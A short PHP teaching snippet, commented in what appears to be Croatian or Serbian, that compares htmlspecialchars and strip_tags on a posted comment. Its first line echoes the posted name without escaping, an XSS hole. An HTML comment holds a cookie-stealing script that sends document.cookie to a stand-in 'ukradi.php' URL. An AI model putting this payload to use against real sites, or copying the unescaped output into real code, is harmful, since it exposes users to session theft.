<?php
echo "<p>{$_POST['ime']} je napisao:<br />";
// echo $_POST['komentar'] ."</p>";

// $komentar = htmlspecialchars("<a href='test'>Test</a>", ENT_QUOTES);
echo htmlspecialchars($_POST['komentar']) . "<br />"; // &lt;a href=&#039;test&#039;&gt;Test&lt;/a&gt;
echo strip_tags($_POST['komentar']) . "<br />"; //izbacuje sve html i php tagove
//<p>Tekst u paragrafu.</p><!-- Komentar --> <a href="# ">Link</a>
echo strip_tags($_POST['komentar'], '<strong><em><u>') . "<br />";
?>

<!-- 
    <script>
	document.location = 'http://www.example.com/ukradi.php?kolacic=' +
      document.cookie
</script>


document.location = 'http://www.example.com/ukradi.php?kolacic=' +
      document.cookie

 -->